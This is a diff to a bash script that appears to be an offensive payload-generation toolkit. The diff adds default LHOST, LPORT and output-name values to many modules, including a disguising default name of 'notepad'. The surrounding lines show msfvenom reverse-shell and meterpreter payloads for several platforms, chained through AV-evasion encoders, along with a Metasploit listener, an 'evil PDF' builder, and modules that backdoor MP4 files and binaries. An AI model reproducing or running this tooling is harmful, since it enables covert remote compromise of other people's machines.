@@ -443,6 +443,11 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 echo ${BlueF}[☠]${white} editing/backup files...${Reset};
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+
 
 echo "${BlueF}[☠]${white} Building shellcode -> C format ..."${Reset};
 sleep 2
@@ -749,6 +754,11 @@ Ext="dll"
 else
 Ext="cpl"
 fi
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 
 echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
@@ -1069,10 +1079,6 @@ fi
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
-
-
-
-
         fi
    fi
 
@@ -1129,6 +1135,10 @@ else
 Ext="cpl"
 fi
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> dll format ..."
 # display final settings to user
@@ -1375,6 +1385,11 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 370 --height 350) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> C format ..."
 sleep 2
@@ -1719,6 +1734,11 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+
 echo "[☠] Building shellcode -> C format ..."
 sleep 2
 echo "[☠] obfuscating -> msf encoders!"
@@ -1814,10 +1834,6 @@ if [ "$OBF" = "None-Obfuscation (default)" ]; then
 
 else
 echo "[✔] String obfuscation technics sellected .."
-### TODO: check if payload executes well in target
-# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
-# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
-#
 cd $IPATH/templates
 
   # edit exec.c using leafpad or gedit editor
@@ -2103,6 +2119,11 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
@@ -2460,6 +2481,11 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+
 echo "[☠] Building shellcode -> C format ..."
 sleep 2
 echo "" > $IPATH/output/chars.raw
@@ -2674,6 +2700,11 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
 N4m=$(zenity --title="☠ MSI NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> msi format ..."
 sleep 2
@@ -2945,9 +2976,14 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> powershell format ..."
 sleep 2
@@ -3265,11 +3301,15 @@ echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: Launcher" --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> HTA-PSH format ..."
 sleep 2
@@ -3575,9 +3615,14 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
@@ -3890,9 +3935,14 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 300) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
@@ -4227,9 +4277,14 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --title="☠ VBS NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1
-
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> vbs format ..."
 sleep 2
@@ -4500,9 +4555,14 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
@@ -4877,10 +4937,15 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ ENTER PDF NAME ☠" --text "Enter pdf output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 Myd0=$(zenity --title "☠ SELECT PDF FILE TO BE EMBEDDED ☠" --filename=$IPATH --file-selection --text "chose PDF file to use to be serve as template") > /dev/null 2>&1
-
-
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+if [ -z "$Myd0" ]; then echo "${RedF}[x]${white} This Module Requires PDF absoluct path input";sleep 3; sh_exit;fi
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
@@ -5220,6 +5285,12 @@ sed -i "s|Lh0St|$lhost|" PDF_encoder.py
 sed -i "s|lP0Rt|$lport|" PDF_encoder.py
 
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+
+
 # runing evil-pdf-builder python script
 xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "python PDF_encoder.py" > /dev/null 2>&1
 # moving files
@@ -5465,6 +5536,11 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1
 
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+
 echo "[☠] Building shellcode -> php format ..."
 sleep 2
 # display final settings to user
@@ -5630,6 +5706,11 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> php format ..."
 sleep 2
@@ -5834,6 +5915,12 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 RRh0St=$(zenity --title="☠ TARGET IP ADRRESS ☠" --text "example: 192.168.1.69" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+if [ -z "$RRh0St" ]; then echo "${RedF}[x]${white} This Module Requires Target ip addr input";sleep 3; sh_exit;fi
+
 echo "[☠] Building shellcode -> php format ..."
 sleep 2
 # display final settings to user
@@ -6026,6 +6113,11 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> python language..."
 sleep 2
@@ -6320,12 +6412,14 @@ echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --title="☠ JAR NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1
-
-
-
 # CHOSE WHAT PAYLOAD TO USE
 serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\n\nAvailable payloads:" --radiolist --column "Pick" --column "Option" TRUE "java/meterpreter/reverse_tcp (default)" FALSE "windows/meterpreter/reverse_tcp (base64)" --width 380 --height 200) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 if [ "$serv" = "java/meterpreter/reverse_tcp (default)" ]; then
 echo "[☠] Building shellcode -> java format ..."
@@ -6732,6 +6826,12 @@ if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
 # CHOSE WHAT PAYLOAD TO USE
 PuLK=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Available payloads:" --radiolist --column "Pick" --column "Option" TRUE "python" FALSE "powershell" --width 305 --height 180) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$srvhost" ]; then srvhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$PuLK" ]; then PuLK="python";fi
 
 
    if [ "$PuLK" = "python" ]; then
@@ -7147,6 +7247,12 @@ if [ "$?" -eq "0" ]; then
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: theMinotaur" --width 300) > /dev/null 2>&1
 VeRp=$(zenity --entry --title "☠ DEBIAN PACKET VERSION ☠" --text "example: 1.0.13" --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$srvhost" ]; then srvhost="$IP";fi
+if [ -z "$VeRp" ]; then VeRp="1.0.13";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+
 # display final settings to user
 cat << !
 
@@ -7296,6 +7402,11 @@ if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> DALVIK format ..."
 # display final settings to user
@@ -7496,6 +7607,10 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "osx/armle/shell_reverse_tcp" FALSE "osx/x64/meterpreter/reverse_tcp" FALSE "apple_ios/aarch64/meterpreter_reverse_tcp" --width 400 --height 250) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> MACHO format .."
 # display final settings to user
@@ -7662,6 +7777,11 @@ if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ FILENAME ☠" --text "Enter payload output name\nexample: vacations" --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> Android ARM format ..."
 # display final settings to user
@@ -7831,6 +7951,11 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x86/meterpreter_reverse_https" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" FALSE "linux/x64/meterpreter/reverse_https" FALSE "linux/x64/meterpreter_reverse_https" --width 400 --height 440) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> ELF format .."
 sleep 2
@@ -8049,15 +8174,6 @@ fi
 
 
 
-
-
-
-
-
-
-
-
-
 #
 # DEBIAN agent (linux systems)
 #
@@ -8069,6 +8185,12 @@ if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" --width 400 --height 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ LOGFILE NAME ☠" --text "Enter logfile output name\nexample: logfile" --width 300) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> C format .."
 sleep 2
@@ -8375,6 +8497,12 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 appl=$(zenity --title "☠ Chose mp4 file to be backdoored ☠" --filename=$IPATH/bin/mp4/ --file-selection) > /dev/null 2>&1
 mP4=$(zenity --entry --title "☠ MP4 NAME ☠" --text "Enter MP4 output name\nexample: ricky-video" --width 300) > /dev/null 2>&1
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$mP4" ]; then mP4="ricky-video";fi
+if [ -z "$appl" ]; then echo "${RedF}[x]${white} This Module Requires one PDF file input";sleep 3; sh_exit;fi
+
 echo "[☠] Building agent -> C format .." && sleep 2
 # display final settings to user
 cat << !
@@ -8584,9 +8712,14 @@ echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: Program" --width 300) > /dev/null 2>&1
-
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
+
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> exe-service format ..."
 sleep 2
@@ -8610,7 +8743,6 @@ xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$
 else
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe-service > $IPATH/output/$N4m.exe"
 fi
-
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
@@ -8809,6 +8941,11 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 echo "[☠] editing/backup files..."
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
 sleep 1
@@ -9196,6 +9333,12 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
 
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
+if [ -z "$interactions" ]; then interactions="3";fi
+
 echo "[☠] Building shellcode -> C format .."
 sleep 2
 # display final settings to user
@@ -9484,6 +9627,11 @@ fi
     paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "meterpreter_reverse_tcp" FALSE "meterpreter_reverse_http" FALSE "meterpreter_reverse_https" --width 350 --height 230) > /dev/null 2>&1
 
 
+## setting default values in case user have skip this ..
+if [ -z "$LhOst" ]; then LhOst="$IP";fi
+if [ -z "$LpOrt" ]; then LpOrt="443";fi
+if [ -z "$appl" ]; then echo "${RedF}[x]${white} This Module Requires one binary.exe input";sleep 3; sh_exit;fi
+
    #
    # grab only the executable name from the full path
    # ^/ (search for expression) +$ (print only last espression)
@@ -9726,6 +9874,11 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
 sleep 2
